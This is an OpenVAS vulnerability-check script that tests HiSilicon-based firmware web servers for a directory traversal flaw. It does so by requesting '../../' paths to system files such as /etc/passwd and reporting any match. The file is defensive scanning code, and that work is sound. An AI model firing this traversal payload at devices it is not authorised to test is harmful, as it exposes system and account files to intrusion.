###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hisilicon_mult_vulns_02_17.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# HiSilicon multiple vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140171");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 13543 $");

  script_name("HiSilicon multiple vulnerabilities");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3025");

  script_tag(name:"vuldetect", value:"Try to read /etc/passwd");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"summary", value:"HiSilicon ASIC firmware are prone to multiple vulnerabilities:

  1. Buffer overflow in built-in webserver

  2. Directory path traversal built-in webserver");

  script_tag(name:"affected", value:"Vendors using the HiSilicon application-specific integrated circuit (ASIC) chip set in their products.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2017-02-22 10:07:23 +0100 (Wed, 22 Feb 2017)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("uc_httpd/banner");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:80 );

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = '../../' + file;
  req = http_get( item:url, port:port );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( string:buf, pattern:pattern ) )
  {
    report = 'By requesting `' + report_vuln_url(  port:port, url:url, url_only:TRUE ) + '` it was possible to read `/' + file + '`. Response:\n\n' + buf + '\n';
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );